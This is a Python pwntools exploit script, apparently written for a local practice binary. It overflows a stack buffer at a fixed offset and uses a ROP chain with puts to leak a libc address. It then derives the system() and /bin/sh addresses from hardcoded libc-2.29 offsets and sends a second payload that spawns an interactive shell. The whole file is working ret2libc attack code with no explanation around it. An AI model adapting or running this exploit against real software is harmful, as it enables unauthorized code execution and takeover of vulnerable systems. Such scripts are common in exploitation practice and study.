#!/usr/bin/python 
from pwn import *

bin = "/home/tao/shellcode/execve_practice/bof" # Binary name
libc = ELF("libc-2.29.so")  # Extract data from libc
elf = ELF(bin)              # Extract data from binary
rop = ROP(elf)              # Extract ROP info from elf(data from binary)
filename = "bof.txt"

# 1093870913 found at offset: 268
offset = 268                    # Amount of chars from start of buff till EBP
junk = "A" * offset             # Random 'A's till right before EIP
control_eip = p32(0xdeadbeef)   # For GDB use
main_prog = p32(0x080491db)     # Address of the beginning of the program
ed_str = p32(0x80482a3)         # bof : 0x80482a3 --> 0x67006465 ('ed')

p = process(bin)                # Start program
raw_input(str(p.proc.pid))      # For GDB use

puts_plt = elf.plt['puts']      # Extracts info on puts@plt
log.info('puts plt : ' + hex(puts_plt))

puts_got = elf.got['puts']      # Extracts info on puts@got
log.info('puts got : ' + hex(puts_got))

popEBX_ret = (rop.find_gadget(['pop ebx','ret']))[0] # Extract info on the location of pop ebx ; ret
log.info('pop ebx ; ret : ' + hex(popEBX_ret))

# Stage 1 
# [ puts@plt | pop ebx ; ret | puts@got | loop to main ]
g1_leak = p32(puts_plt)
g1_leak += p32(popEBX_ret)
g1_leak += p32(puts_got)
g1_leak += main_prog

bof = junk + g1_leak            # Forms payload

p.recvline()
p.sendline(bof)

reply = p.recv()                # Stores program reply in a variable
#print hexdump(reply)

leak = reply[reply.find("AAA`") + 20 :  reply.find(' Ple') - 8] # Calculate exact location of leaked address
print hexdump(leak)
puts = u32(leak)
log.success('puts() address : ' + hex(puts))

offset_puts = 0x29d70           # Difference between system() and puts()
system = puts - offset_puts
log.success('system() address : ' + hex(system))

offset_sh = 0x113e08            # Difference between /bin/sh and puts()
binSH = puts + offset_sh
log.success('/bin/sh address : ' + hex(binSH))

# Stage 2
# [ system() | 0xdeadbeef | /bin/sh ]
g2_shell = p32(system)
g2_shell += control_eip
g2_shell += p32(binSH)

bof = junk  + g2_shell          # Forms payload

p.sendline(bof)
p.interactive()
